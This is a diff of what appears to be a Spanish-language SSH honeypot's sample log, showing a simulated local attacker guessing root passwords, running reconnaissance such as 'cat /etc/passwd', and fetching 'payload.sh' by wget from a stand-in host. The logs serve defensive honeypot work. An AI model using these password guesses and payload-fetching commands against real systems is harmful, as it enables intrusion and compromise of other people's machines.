@@ -4,17 +4,17 @@
    Registro: logs/honeypot.jsonl
    Ctrl-C para detener.
 
-2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 connect
-2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 login_attempt user=root password=123456 result=denied
-2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 login_attempt user=root password=admin result=denied
-2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 login_attempt user=root password=toor result=accepted
-2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 login_accepted user=root
-2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 command command=uname -a
-2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 command command=whoami
-2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 command command=id
-2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 command command=ls
-2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 command command=cat /etc/passwd
-2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 command command=wget http://198.51.100.7/payload.sh
-2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 download_attempt command=wget http://198.51.100.7/payload.sh url=http://198.51.100.7/payload.sh archivo=payload.sh bytes=1024 herramienta=wget
-2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 command command=exit
-2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 session_end duration=0s
+2026-11-21T11:29:26Z [ssh] 127.0.0.1:58744 connect
+2026-11-21T11:29:26Z [ssh] 127.0.0.1:58744 login_attempt user=root password=123456 result=denied
+2026-11-21T11:29:26Z [ssh] 127.0.0.1:58744 login_attempt user=root password=admin result=denied
+2026-11-21T11:29:26Z [ssh] 127.0.0.1:58744 login_attempt user=root password=toor result=accepted
+2026-11-21T11:29:26Z [ssh] 127.0.0.1:58744 login_accepted user=root
+2026-11-21T11:29:26Z [ssh] 127.0.0.1:58744 command command=uname -a
+2026-11-21T11:29:26Z [ssh] 127.0.0.1:58744 command command=whoami
+2026-11-21T11:29:26Z [ssh] 127.0.0.1:58744 command command=id
+2026-11-21T11:29:26Z [ssh] 127.0.0.1:58744 command command=ls
+2026-11-21T11:29:26Z [ssh] 127.0.0.1:58744 command command=cat /etc/passwd
+2026-11-21T11:29:26Z [ssh] 127.0.0.1:58744 command command=wget http://198.51.100.7/payload.sh
+2026-11-21T11:29:26Z [ssh] 127.0.0.1:58744 download_attempt command=wget http://198.51.100.7/payload.sh url=http://198.51.100.7/payload.sh archivo=payload.sh bytes=1024 herramienta=wget
+2026-11-21T11:29:26Z [ssh] 127.0.0.1:58744 command command=exit
+2026-11-21T11:29:26Z [ssh] 127.0.0.1:58744 session_end duration=373ms
